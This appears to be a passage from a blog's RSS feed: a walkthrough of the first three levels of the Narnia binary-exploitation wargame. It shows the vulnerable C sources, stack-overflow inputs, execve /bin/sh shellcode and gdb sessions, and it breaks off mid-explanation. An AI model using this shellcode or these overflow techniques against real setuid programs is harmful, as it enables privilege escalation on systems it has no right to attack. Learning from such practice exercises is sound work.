level, I decided to post anyway. I&amp;rsquo;ll update this when I have this figured out.&lt;/p&gt;

&lt;p&gt;Sorry.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Narnia Part 1</title>
      <link>http://unlogic.co.uk/2015/04/08/solving-narnia-part1/</link>
      <pubDate>Wed, 08 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/04/08/solving-narnia-part1/</guid>
      <description>

&lt;p&gt;Next up we take on &lt;a href=&#34;http://overthewire.org/wargames/narnia/&#34;&gt;Narnia&lt;/a&gt;. This is a
binary exploit centered wargame, so fire up your debuggers and let&amp;rsquo;s smash those
stacks. For levels 5, 6, 7, and 8, see &lt;a href=&#34;http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/&#34;&gt;part 2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;All levels are in &lt;code&gt;/narnia&lt;/code&gt; and both the binary and the source are provided.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve not included the passwords here, so you&amp;rsquo;ll have to work through
the exercises yourself (or find them elsewhere :))&lt;/p&gt;

&lt;h2 id=&#34;level-00:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 00&lt;/h2&gt;

&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;val&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0x41414141&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Here is your chance: &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;scanf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%24s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;buf);&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;buf: %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,buf);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;val: 0x%08x&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,val);&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(val&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;system(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;WAY OFF!!!!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
on the stack works, we can exploit the setup on lines 5 and 6. &lt;code&gt;buf&lt;/code&gt; is a
fixed size and is allocated &lt;em&gt;after&lt;/em&gt; &lt;code&gt;val&lt;/code&gt;. Therefore it sits above &lt;code&gt;val&lt;/code&gt; on
the stack. As there is no &lt;a href=&#34;https://en.wikipedia.org/wiki/Address_space_layout_randomization&#34;&gt;ASLR&lt;/a&gt;
we should be able to write over the end of &lt;code&gt;buf&lt;/code&gt; and overwrite what is in memory
at &lt;code&gt;val&lt;/code&gt;&amp;rsquo;s location.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s try it&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*50&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0 
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
val: 0x43434343
WAY OFF!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Right, we can confirm that we are able to change the value of &lt;code&gt;val&lt;/code&gt;. Let&amp;rsquo;s
tread a bit more carefully and try to see if we can do it more accurately&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;BBBB&amp;#39;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0 
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
val: 0x42424242
WAY OFF!!!!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So there is no space between &lt;code&gt;val&lt;/code&gt; and &lt;code&gt;buf&lt;/code&gt;, therefore 20 characters plus a
further 4 is enough to change val. Let&amp;rsquo;s write in the correct value, reversed of
course because of the endian notation&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;\xef\xbe\xad\xde&amp;#39;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
narnia0@melinda:/narnia$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We did it&amp;hellip;. but wait, where&amp;rsquo;s the shell? It&amp;rsquo;s closed, that&amp;rsquo;s where it is. We
need to keep it open. The trick is to append the &lt;code&gt;cat&lt;/code&gt; command to the input&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia0@melinda:/narnia$ &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;python -c &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;print &amp;#39;C&amp;#39;*20 + &amp;#39;\xef\xbe\xad\xde&amp;#39;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; cat&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;|&lt;/span&gt; ./narnia0
Correct val&amp;#39;s value from 0x41414141 -&amp;gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
[password]
&lt;/pre&gt;&lt;/div&gt;


&lt;h2 id=&#34;level-01:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 01&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret)();&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;NULL){&lt;/span&gt;    
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Trying to execute EGG!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;getenv(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;EGG&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;ret();&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;So here we need to set an environment variable named &lt;code&gt;EGG&lt;/code&gt; to something
we want executed. We can&amp;rsquo;t just pass &lt;code&gt;/bin/bash&lt;/code&gt; as it&amp;rsquo;s going to call whatever
we give it as a function. Ideally we want a shell, so what we need in this case
is the shellcode to do just that.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia1@melinda:/narnia$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;export EGG&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;$(&lt;/span&gt;python -c&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;print &amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&amp;quot;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;)&lt;/span&gt;
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
[password]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-02:dadecd8e397495e170ebcbe00dd8239d&#34;&gt;Level 02&lt;/h2&gt;

&lt;p&gt;&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[]){&lt;/span&gt;
	&lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;128&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;){&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Usage: %s argument&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
		&lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;strcpy(buf,argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
	&lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buf);&lt;/span&gt;

	&lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;

&lt;p&gt;The biggest clues here are lines 6 and 12. Copying user supplied data
into a fixed sized array without any bound checking is always asking for
trouble. &lt;code&gt;narnia2&lt;/code&gt; binary also runs as setuid narnia3, which leads us to believe
we will be able to control the stack and get it to execute a payload of our
choosing. Of course this will be a shellcode to drop us into a shell.&lt;/p&gt;

&lt;p&gt;First we need to work out how much data is needed to overwrite &lt;code&gt;EIP&lt;/code&gt;. We can
do this by trial and error, or we can use a pattern generator. I am going to
use my &lt;a href=&#34;https://github.com/Svenito/exploit-pattern&#34;&gt;pattern generator&lt;/a&gt; instead
of metasploit&amp;rsquo;s one. I&amp;rsquo;ll create a payload big enugh to overflow the
buffer and then check the value of &lt;code&gt;EIP&lt;/code&gt;. Pasting that back into the pattern
generator will tell us at what location in the pattern the string occurs.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;narnia2@melinda:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) info reg
eax            0x0	0
ecx            0x0	0
edx            0xf7fcb898	-134432616
ebx            0xf7fca000	-134438912
esp            0xffffd640	0xffffd640
ebp            0x65413565	0x65413565
esi            0x0	0
edi            0x0	0
eip            0x37654136	0x37654136
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;local $] ./pattern.py 0x37654136
Pattern 0x37654136 first occurrence at position 140 in pattern.
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We can control &lt;code&gt;EIP&lt;/code&gt; with whatever we put at position 140 of our payload. But
what do we put there? Well for that we need to figure out where the rest of our
data is going. Using a known payload let&amp;rsquo;s see where our input ends up:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;(gdb) run $(python -c &amp;quot;print &amp;#39;a&amp;#39; * 140 + &amp;#39;b&amp;#39; * 4&amp;quot;)
Starting program: /games/narnia/narnia2 $(python -c &amp;quot;print &amp;#39;a&amp;#39; * 140 + &amp;#39;b&amp;#39; * 4&amp;quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
(gdb) x/200x $esp
0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea
0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768
0xffffd670:	0x0804821c	0xf7fca000	0x00000000	0x00000000
0xffffd680:	0x00000000	0xed18585e	0xd520bc4e	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360
0xffffd6a0:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381
0xffffd6c0:	0x0804845d	0x00000002	0xffffd6e4	0x080484d0
0xffffd6d0:	0x08048540	0xf7feb180	0xffffd6dc	0x0000001c
0xffffd6e0:	0x00000002	0xffffd812	0xffffd828	0x00000000
0xffffd6f0:	0xffffd8b9	0xffffd8cd	0xffffd8dd	0xffffd8f0
0xffffd700:	0xffffd913	0xffffd927	0xffffd930	0xffffd93d
0xffffd710:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd720:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd730:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd740:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd750:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd760:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd770:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd780:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd790:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd7a0:	0x00000009	0x08048360	0x0000000b	0x000036b2
0xffffd7b0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2
0xffffd7c0:	0x0000000e	0x000036b2	0x00000017	0x00000000
0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2
0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000
0xffffd7f0:	0x00000000	0x00000000	0xe8000000	0x7c03ba19
0xffffd800:	0x2bd0895a	0x3866226d	0x69ad5957	0x00363836
0xffffd810:	0x672f0000	0x73656d61	0x72616e2f	0x2f61696e
0xffffd820:	0x6e72616e	0x00326169	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626262	0x47445800	0x5345535f
0xffffd8c0:	0x4e4f4953	0x3d44495f	0x30333035	0x45485300
0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
0xffffd8e0:	0x78723d4d	0x322d7476	0x6f633635	0x00726f6c
0xffffd8f0:	0x5f485353	0x45494c43	0x323d544e	0x322e3231
0xffffd900:	0x37352e33	0x3136312e	0x35333320	0x34203932
0xffffd910:	0x53003334	0x545f4853	0x2f3d5954	0x2f766564
0xffffd920:	0x2f737470	0x4c003033	0x4c415f43	0x00433d4c
0xffffd930:	0x52455355	0x72616e3d	0x3261696e	0x5f534c00
0xffffd940:	0x4f4c4f43	0x723d5352	0x3a303d73	0x303d6964
0xffffd950:	0x34333b31	0x3d6e6c3a	0x333b3130	0x686d3a36
0xffffd960:	0x3a30303d	0x343d6970	0x33333b30	0x3d6f733a
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;We see our payload start at &lt;code&gt;0xffffd828&lt;/code&gt; with the last 4 bytes at &lt;code&gt;0xffffd8b4&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we&amp;rsquo;ll pad the
start with a &lt;a href=&#34;https://en.wikipedia.org/wiki/NOP_slide&#34;&gt;nop sled&lt;/a&gt; to adjust for
the memory offset introduced by &lt;code&gt;gdb&lt;/code&gt;. Then set the &lt;code&gt;EIP&lt;/code&gt; to somewhere in the middle
of the sled&lt;/p&gt;

